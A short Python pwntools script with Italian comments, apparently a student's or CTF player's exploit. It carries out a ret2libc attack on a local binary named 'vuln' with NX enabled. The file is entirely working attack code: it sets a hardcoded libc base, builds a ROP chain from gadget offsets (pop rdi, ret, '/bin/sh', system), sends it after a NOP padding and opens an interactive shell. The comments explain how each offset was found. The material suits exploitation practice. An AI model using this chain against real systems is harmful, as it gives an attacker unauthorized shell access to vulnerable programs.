#Quando NX è abilitato
from multiprocessing import process
import sys
import struct
from pwn import *




p = process("./vuln")
#p64 lo uso perchè gli indirizzi non sono quelli che si aspetta il sistema, quindi li mette in un formato giusto e funzionante

# nop slides, così sto sicuro
nops = b"\x90"*216


# vmmap     per vedere la mappatura in gdb

#### PRENDERE IL PRIMO CHE C'é CHE HA libc-2.31.so  in questo caso , con START
libc_base_address = 0x00007ffff7dc4000
"""un altro modo per trovarlo è  ldd vuln2 e vedo l'indirizzo in cui viene caricata ma se ho le variabili di ambiente non funziona perchè mi sfasa gli indirizzi"""

#ropper --file  path_del_file_lib_c --search "pop rdi; ret;"
pop_rdi = p64(libc_base_address + 0x23b6a)

#readelf -s path_lib_c | grep "system"  e prendo l'offset che mi ritorna
system = p64(libc_base_address + 0x52290)

#strings -a -t x path_libc | grep  "/bin/sh"
bin_sh = p64(libc_base_address + 0x1b45bd)

#ropper --file path_libc  --search "ret;"
ret = p64(libc_base_address + 0xbe2f9) 


#faccio direttamente tutto, eseguo il binario con la payload
p.sendline(nops + ret + pop_rdi + bin_sh + system)

#apro il prompt dei comandi per fare cose in modo interattivo, va molto meglio
p.interactive()
